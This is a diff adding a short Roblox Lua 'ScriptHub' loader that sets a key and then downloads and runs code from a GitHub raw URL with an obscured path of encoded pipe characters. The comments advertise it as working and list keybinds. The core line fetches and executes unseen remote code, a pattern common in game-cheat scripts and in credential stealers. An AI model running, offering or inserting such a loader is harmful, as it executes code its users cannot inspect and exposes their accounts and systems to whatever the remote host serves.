@@ -1,0 +1,6 @@
+_G.Key = "X135XX3XXXXXXDASXDSAFDGCMX3XXX"
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Secruity/-/main/%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C%7C'))()
+--ScriptHub (WORKING)
+-- Keybinds
+-- Close Scripthub (L)
+-- Close Other Guis (M) Or (P)
